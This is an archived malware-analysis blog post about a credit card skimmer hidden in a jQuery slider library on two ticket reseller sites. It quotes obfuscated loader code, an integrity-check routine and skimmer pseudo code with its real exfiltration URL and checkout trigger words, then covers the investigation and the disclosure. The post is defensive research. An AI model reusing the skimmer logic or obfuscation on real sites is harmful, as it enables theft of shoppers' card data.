{
    "id": "f9bd0038-7d42-4e3f-9000-464bc1ac4222",
    "created_at": "2023-01-12T14:59:26.886969Z",
    "updated_at": "2025-03-27T02:10:49.394194Z",
    "deleted_at": null,
    "sha1_hash": "8e0c7e366d4ecd5bbf1bd1e56a21027b543bfc00",
    "title": "2020-01-20 - Ticket resellers infected with a credit card skimmer",
    "authors": "",
    "file_creation_date": "2022-05-28T03:50:30Z",
    "file_modification_date": "2022-05-28T03:50:30Z",
    "file_size": 108069,
    "plain_text": "# Ticket resellers infected with a credit card skimmer\n\n**[maxkersten.nl/2020/01/20/ticket-resellers-infected-with-a-credit-card-skimmer/](https://maxkersten.nl/2020/01/20/ticket-resellers-infected-with-a-credit-card-skimmer/)**\n\n20/01/2020\n\n[First and foremost I’d like to thank Jacob Pimental since he posted the initial lead, after](https://www.goggleheadedhacker.com/)\nwhich we joined forces to dive into this case. In his now deleted Tweet, he asked if anybody\n[could help out with a potential credit card skimmer on the OlympicTickets2020 website.](https://www.olympictickets2020.com/)\n\n## Background information\n\nBefore diving into this case, I’ll highlight the modus operandi that most credit card skimmers\nuse. There are certain JavaScript files that are loaded on all web pages. Prime examples of\nthis are [jQuery or](https://jquery.com/) [Bootstrap libraries. Since they are present on all pages, these files are the](https://getbootstrap.com/)\nperfect target to also contain the JavaScript based credit card skimmer code. Essentially, the\nvisitor will run this code on every web page that is visited.\n\nEnumerating and breaching websites takes time, and the skimmer’s life span is of unknown\nduration. The code could be detected within a few hours, or stay there for months. To\nincrease the effectiveness of the skimmer, actors try to breach content delivery networks that\nhost the commonly used libraries. Whilst this approach brings greater income, it will likely\nlead to a faster detection, as the online presence of the script is much bigger. Note that not\nall sites that use the infected library are e-commerce shops.\n\nAt last, the skimmers are generally obfuscated to make it harder for detection mechanisms to\ndetect the code.\n\n## Back to the case\n\nBased on Jacob’s suspicion, I took a look at the given JavaScript file. This file (located at\n_/dist/slippry.min.js) contained a small description, together with code. The description is given_\nbelow.\n```\n/** @preserve\n *\n * slippry v1.4.0 - Responsive content slider for jQuery\n * http://slippry.com\n *\n * Authors: Lukas Jakob Hafner - @saftsaak\n *     Thomas Hurd - @SeenNotHurd\n *\n * Copyright 2016, booncon oy - http://booncon.com\n *\n *\n * Released under the MIT license - http://opensource.org/licenses/MIT\n */\n\n```\n\n-----\n\nPer the header, the script should contain a responsive content slider for jQuery. After\nbeautifying the script, the aforementioned modus operandi became apparent. An existing\npiece of JavaScript was abused to hide the malicious code. In this case, the library was\nhosted on the targeted site itself. There is no information as to how the malicious code got\nappended to the library.\n\n## Stage 1 – The loader\n\nThe complete file slippry file can be defined in the below given pseudo code.\n```\n/**\n * Description\n */\nfunction sliderfunctionX() { ... }\nfunction sliderfunctionY() { ... }\n//...\n(function skimmer() { ... })()\n\n```\nThe original code was left untouched, and the skimmer function would be executed the\nmoment the rest of the JavaScript was loaded.\n\nWhen retrieving the function definition of the skimmer, it reminded me of [a blog post I wrote](https://maxkersten.nl/binary-analysis-course/malware-analysis/magecart/)\nabout the Magecart skimmer in March 2019. The structure of the loader is, aside from the\nrandom variable names and script content, exactly the same. For a complete and in-depth\noverview, I can advise to read the above-mentioned write-up.\n\nThe complete first stage consists garbage code, string obfuscation, string concatenation\noperations, and a decryption routine. The structure is given below in pseudo code.\n```\nvar a = \"encryptedScriptPart1\" + \"encryptedScriptPart2\";\nvar b = \"encryptedScriptPart3\";\nvar encryptedScript = document[\"cr\" + (74 > 4 ? \"\\x65\" : \"\\x60\") + \"ateEle\" + \"m\" +\n(81 > 6 ? \"\\x65\" : \"\\x5b\") + \"nt\"](\"div\");\nvar encryptedScript = a + b;\nvar script = \"\";\nfor (var i = 0; i < script.length; i++) {\n //decryption routine to fill script with the decrypted content of encryptedScript\n}\nconstructor(script);\n\n```\nPractically, this looked a little bit less readable, as can be seen in the excerpt below.\n\n\n-----\n\n```\nvar I80 0a0w0w0w0w0w0w0w0w0w0w0w0w2u39322r382x333 20w2w2 +\n\"w14382t3c38153f0a0w0w0w0w0w0w0w0w0w0w0w0w\" +\n\"0w0w0w0w2x2u0w14382t3c381a302t322v382w0w1p 1p0w1c150w362t383936320w1c1n3a\" +\n\"2p360w2w2p372w0w1p0w1c1n0a0w0w0w0w0w0w0w0w0w0w0w0w0w0w0w\";;\nvar yc8 = \"z2l1b2v180y0y1515152. j0y380y17141j1h1q1f1k1r\";;\nvar C46 = document[\"cr\" + (74 > 4 ? \"\\x65\" : \"\\x60\") + \"ateEle\" + \"m\" + (81 > 6 ?\n\"\\x65\" : \"\\x5b\") + \"nt\"](\"div\");;\nvar TLM = \"\";;\nfor (var W5A = (\"KL4b>q5\\x7fE%\\x87XHl=i\" [\"charCodeAt\"](2) * 0 + 0.0); W5A < C46[\"l\"\n+ (59 > 0 ? \"\\x65\" : \"\\x60\") + \"n\" + \"\" + (55 > 0 ? \"\\x67\" : \"\\x5f\") + \"th\"]; W5A +=\n(0 * \"U4+z[-#V/v.)X\" [\"charCodeAt\"](7) + 2.0)) {\n    TLM += String[\"fromC\" + String.fromCharCode(104) + \"ar\" + \"Cod\" + (93 > 16 ?\n\"\\x65\" : \"\\x5b\") + \"\"](parseInt(C46[\"\" + (87 > 46 ? \"\\x73\" : \"\\x6b\") + \"ubs\" + \"t\" +\n(85 > 2 ? \"\\x72\" : \"\\x6d\") + \"\"](W5A, (\"ACljF\\x60q&sp@SI\" [\"length\"] * 0 + 2.0)),\nTpU))\n};\nW4L = \"34302p2r2t0y2l141b2j1l391u262k2j321g2k1q2q. 2\";;\nih3[\"\" + String.fromCharCode(116) + \"oStri\" + \"\" + String.fromCharCode(110) + \"g\"] =\nNbZ[\"c\" + String.fromCharCode(111) + \"n\" + \"\" + (76 > 38 ? \"\\x73\" : \"\\x6b\") +\n\"tructor\"](TLM);;\n\n```\nThe variable named TLM contains all the code for the second stage. As such, one can print\nthe content of the variable and remove the line where the constructor is invoked. Runing the\ncode in the browser’s console or using node from the terminal suffices.\n\n## Stage 2 – The skimmer\n\nThe second stage contains the actual skimmer in obfuscated form, together with an integrity\ncheck, string obfuscation, and dead code insertion.\n\nThe integrity check is done to verify that the script is not altered. In the code below, the\nhashing function is given, together with the integrity check.\n```\nfunction hh(text) {\n  if (text.length == 0) return 0;\n  var hash = 0;\n  for (var i = 0; i < text.length; i++) {\n    hash = ((hash << 5) - hash) + text.charCodeAt(i);\n    hash = hash & hash;\n  }\n  return hash % 255;\n}\nvar body = window.bAQ.toString().replace(/[^a-zA-Z0-9\\-\"]+/g, \"\");\nvar crc = body.match(/aeh3jiqq7nr76my8hfmg([\\w\\d\\-]+)\"/g)\n[0].replace(\"aeh3jiqq7nr76my8hfmg\", \"\");\ncrc = crc.substr(0, crc.length - 1);\nbody = hh(body.replace(\"aeh3jiqq7nr76my8hfmg\" + crc, \"aeh3jiqq7nr76my8hfmg\")) == crc\n? 1 : window[\"stO\"](\"\");;\n\n```\nThe dead code can easily be recognised, as it is not used anywhere else. A variable that is\nonly declared and instantiated can just as well be removed. The string obfuscation can easily\nbe removed by copying code into the browser’s console and using the generated output An\n\n\n-----\n\nexample is given below.\n```\nJZO = (\"nLe+.\" [\"length\"] * 63 + 0.0);\nvar fl7 = (\"C\\x88bSIM\\x81-c3\" [\"charCodeAt\"](4) * 6 + 39.0);\nvar ufN = \"(ht;X5y<rSmX-F6gOq3zOI\" [\"replace\"](/[\\<Orh6m\\;\\(5\\-3]/g, \"\");\n\n```\nThe variables names of the original script weren’t randomised and contained names like\n_gatelink or nowwork. The deobfuscated result is a clear skimmer. So clean, that directly_\nsharing it feels irresponsible, as one only needs to alter two variables to make it work again.\nAs such,I’ll only provide the pseudo code to explain the inner workings.\n```\nvar gatelink = \"https://opendoorcdn.com/cdn/font.js\";\nvar method = \"POST\"\nvar thisdomain = window[\"location\"][\"host\"] || \"nodomain\";\nvar datacollect = false;\nvar cachelenght = 50;\nvar nowwork = true;\nfunction removeLocalStorageData() { ... }\nfunction resetLocalStorageData() { ... }\nfunction getValuesFromFields() { ... }\nfunction exfiltrateData() { ... }\nfunction addEventListeners() { ... }\nif ((\"/onepage|checkout|store|cart|pay|panier|kasse|order|billing|purchase|basket/\")\n[\"test\"](window[\"location\"])) {\n  nowwork = true;\n  if (nowwork) {\n    addEventListeners();\n    if (localStorage[\"getItem\"](\"_google.verify.cache.001\") !== null &&\nlocalStorage[\"getItem\"](\"_google.verify.cache.001\")[\"length\"] > cachelenght) {\n      resetLocalStorageData();\n      window[\"addEventListener\"](\"unload\", exfiltrateData());\n    }\n  } else {\n    removeLocalStorageData();\n  }\n}\n\n```\nNote that the keyword function is not executable in the current form. This is done\nintentionally, as this pseudo code only serves to show the skimmer’s functionality. It is not\nintended to serve as a proof-of-concept piece of code.\n\nOnly if the current website contains one of the trigger words, the skimmer becomes active. It\nadds event listeners to all forms on the website, base64 encodes the data. If the amount of\ncaptured data is more than 50 characters, an additional event listener is created to execute\n\n\n-----\n\nthe exfiltrateData function just before the page unloads. Upon confirming the order, and just\nbefore leaving the page, the data is exfiltrated to the given domain using a POST request. As\na result, the customer’s details are skimmed.\n\nOn the payment page of the targeted sites, the word order is present in the URL, meaning\nthe skimmer would activate.\n\n## Connecting the dots\n\nAfter making sure that the skimmer was indeed present, there were two questions left. Since\nthe infection did not occur via a CDN, it is hard to find out how widespread this infection is.\nSecondly, we wanted to know how long the skimmer had been in place.\n\n### Finding other sites\n\n[Jacob searched for the JavaScript library’s hash on UrlScan, which can be found here. This](https://urlscan.io/search/#hash%3Ac4cb9670fcf212994689aa208d5bd6e4fcee61e20277422019a33baf01b7b0e5)\nshows that this specific file is also present on another site: eurotickets2020.com. The lay-out\nand looks of the two sites are rather familiar. When looking on the about page, the same\nowner can be found. Additionally, the phone number for customer support is also the same.\n\n### Dating back the infection\n\nTo find the first observations of the skimmer in the wild, I tried my luck on the Wayback\nMachine and found one hit for each site. The skimmer on the OlympicTickets site was\n[indexed on the third of December 2019, as can be seen here. The skimmer on the](https://web.archive.org/web/20191203231251/https://www.olympictickets2020.com/dist/slippry.min.js)\n[EuroTickets site was indexed on the seventh of January 2020, as can be seen here.](https://web.archive.org/web/20200107205951/https://www.eurotickets2020.com/dist/slippry.min.js)\n\nAt the time of writing (the 21st of January 2020), this skimmer has been active for 50 days\n(or 15 days in case of the EuroTickets site). The skimmer was taken down from both\n[OlympicTickets and](https://web.archive.org/web/20200122184514/https://www.olympictickets2020.com/dist/slippry.min.js) [EuroTickets during the writing of this article, making the mentioned days](https://web.archive.org/web/20200122183934/https://www.eurotickets2020.com/dist/slippry.min.js)\nthe total amount of days that the skimmer was present.\n\n[As one can see in this copy in the Wayback Machine, the website’s layout is partially broken](https://web.archive.org/web/20200121184623/https://www.olympictickets2020.com/)\ndue to the lack of the jQuery library. It is still referenced in the code, but it does not exist on\nthe server right now.\n\nThe next step was to contact the site’s owners with our findings in a responsible manner.\n\n## Responsible disclosure\n\nBefore posting these details online, one should contact the company to resolve the problem\nat hand. This also gives them some time to issue a statement to their customers. On the\nother hand, you cannot wait for an extended period of time if the company does not respond\n(or does not acknowledge the problem), as this puts the customers in danger longer than\nneed be.\n\n\n-----\n\nDirectly after our findings, we e-mailed them via the provided e-mail address, we Tweeted to\nboth [OlympicTickets and](https://twitter.com/Libranalysis/status/1218315924127789056) [EuroTickets to inform them of the skimmer.](https://twitter.com/Libranalysis/status/1219570027453698048)\n\nSince there was no response on any of these during the weekend, I contacted them on\nMonday morning via their live chat support system. The first contact was not followed up\nupon after leaving my phone number. The second contact via the live chat provided us with\nthe information that the security team could not find anything, after which the case was\nclosed. Jacob gave them a call with the request to look into it again.\n\nThe day after, I contacted them again via the live chat system. Despite our instructions, the\nsecurity team could not find the skimmer. This again lead to the closure of the ticket. During\nthat evening, the script got removed from the site.\n\n## Conclusion\n\nIf you have shopped at either olympictickets2020.com or eurotickets2020.com between the\nthird of December 2019 and the 21st of January 2020, your credit card credentials are likely\nto be compromised. Please request a new credit card and contact your bank accordingly.\nAlso note that all information that was entered on the site’s payment form was stolen by the\ncredit card skimmer and should be considered compromised.\n\nI’d like to thank Jacob for the splendid cooperation during our work on this case. Even\nthough we live in different time zones, as well as the fact that we only conversed via chat, we\nworked on the case simultaneously and in parallel where possible.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-20 - Ticket resellers infected with a credit card skimmer.pdf"
    ],
    "report_names": [
        "2020-01-20 - Ticket resellers infected with a credit card skimmer.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535566,
    "ts_updated_at": 1743041449,
    "ts_creation_date": 1653709830,
    "ts_modification_date": 1653709830,
    "files": {
        "pdf": "https://archive.orkl.eu/8e0c7e366d4ecd5bbf1bd1e56a21027b543bfc00.pdf",
        "text": "https://archive.orkl.eu/8e0c7e366d4ecd5bbf1bd1e56a21027b543bfc00.txt",
        "img": "https://archive.orkl.eu/8e0c7e366d4ecd5bbf1bd1e56a21027b543bfc00.jpg"
    }
}